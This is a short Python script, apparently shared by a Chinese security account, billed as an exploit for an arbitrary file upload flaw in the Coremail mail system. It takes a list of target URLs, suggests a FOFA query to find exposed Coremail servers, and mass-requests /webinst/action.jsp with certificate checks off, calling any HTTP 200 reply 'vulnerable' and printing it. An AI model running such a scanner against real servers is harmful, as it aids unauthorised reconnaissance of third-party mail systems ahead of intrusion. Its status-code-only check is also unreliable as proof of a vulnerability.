import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[31m公众号 : 深夜笔记本                                                  \033[0m')
    print('+  \033[31mVersion: Coremail 邮件系统任意文件上传漏洞                              \033[0m')
    print('+  \033[31m使用格式:  python3 exp.py                                            \033[0m')
    print('+  \033[31mVersion: fofa：app="Coremail邮件系统""                                \033[0m')
    print('+  \033[31m保存连接到url.txt                                                     \033[0m')
    print('+------------------------------------------')


def POC_1(target_url):
    url = target_url + "/webinst/action.jsp"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        r = requests.get(url=url, headers=headers, verify=False, timeout=5)
        print("\033[32m[o] 正在请求 {}/webinst/action.jsp \033[0m".format(target_url))
        if  r.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 \033[0m".format(target_url))
            print("\033[32m[o] 响应为:\n{} \033[0m".format(r.text))
        else:
            print("\033[31m[x] 不存在漏洞 \033[0m")

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)




if __name__ == '__main__':
    title()
    with open('url.txt', 'r', encoding='utf-8') as f:
        for i in f.readlines():
            s = i.strip()
            target_url = s
            POC_1(target_url)
